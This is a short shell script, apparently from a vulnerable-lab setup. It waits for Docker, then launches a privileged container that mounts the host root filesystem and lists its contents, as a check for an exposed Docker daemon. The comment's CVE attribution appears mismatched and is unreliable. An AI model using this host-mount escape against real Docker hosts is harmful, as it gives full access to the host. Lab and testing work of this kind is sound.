#!/bin/sh
# Wait until Docker daemon is reachable
while ! docker info >/dev/null 2>&1; do
  echo "Waiting for Docker daemon..."
  sleep 1
done

# Exploit attempt for CVE-2021-28169 â€“ leveraging an insecure Docker daemon (2375) exposed by the vulnerable_engine container.
# The payload tries to mount the host filesystem inside a new privileged container.

docker run --rm --privileged -v /:/host -w /host alpine:3.14 sh -c "echo 'Listing root of host (first 10 entries):'; ls -1 | head"

echo "Exploit attempt finished. If you see host filesystem listings above, the vulnerability is present."